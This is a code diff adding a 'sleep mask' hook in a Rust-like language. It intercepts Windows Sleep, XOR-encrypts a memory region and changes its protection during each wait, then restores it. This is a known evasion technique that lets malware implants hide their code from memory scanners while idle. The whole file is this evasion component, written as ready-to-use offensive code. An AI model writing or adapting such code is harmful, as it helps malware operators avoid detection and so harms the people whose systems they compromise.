@@ -1,0 +1,33 @@
+
+use opsec_sleep_mask;
+
+static __opsec_sleep_base: u64 = 0;
+static __opsec_sleep_size: u64 = 0;
+static __opsec_sleep_key:  u8  = (u8)0x5A;
+static __opsec_sleep_prot: u32 = (u32)0x20;
+
+[Hook("KERNEL32$Sleep")]
+fn __opsec_sleep_hook(ms: u32) -> void {
+    var sz: u64 = __opsec_sleep_size;
+    var k:  u8  = __opsec_sleep_key;
+    var base: u64 = __opsec_sleep_base;
+    var orig_prot: u32 = __opsec_sleep_prot;
+
+    if sz != 0 {
+        var old: u32 = 0;
+        opsec_set_protect(base, sz, (u32)0x04, &old);   // PAGE_READWRITE
+        opsec_xor_region(base, sz, k);
+    }
+
+    var interval: u64 = 0;
+    var as_i64: i64 = 0 - ((i64)ms * (i64)10000);
+    interval = (u64)as_i64;
+    Ntdll.NtDelayExecution(0, (void*)&interval);
+
+    if sz != 0 {
+        opsec_xor_region(base, sz, k);
+        var dummy: u32 = 0;
+        opsec_set_protect(base, sz, orig_prot, &dummy);
+    }
+    ret;
+}
